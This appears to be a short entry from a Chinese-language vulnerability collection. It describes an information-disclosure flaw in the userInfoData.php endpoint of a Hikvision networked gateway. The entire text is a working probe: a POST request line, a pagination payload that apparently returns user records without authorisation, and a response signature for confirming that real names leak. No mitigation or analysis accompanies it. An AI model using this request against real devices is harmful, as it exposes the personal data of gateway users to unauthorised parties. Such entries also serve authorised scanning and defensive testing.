# HIKVISION联网网关userInfoData.php接口处敏感信息泄露漏洞

海康 ｜ 信息泄露 ｜ —
- **请求**：`POST /data/userInfoData.php HTTP/1.1`

**Payload**
```
page=1&rows=20&sort=userId&order=asc
```
- **响应特征**：200 realName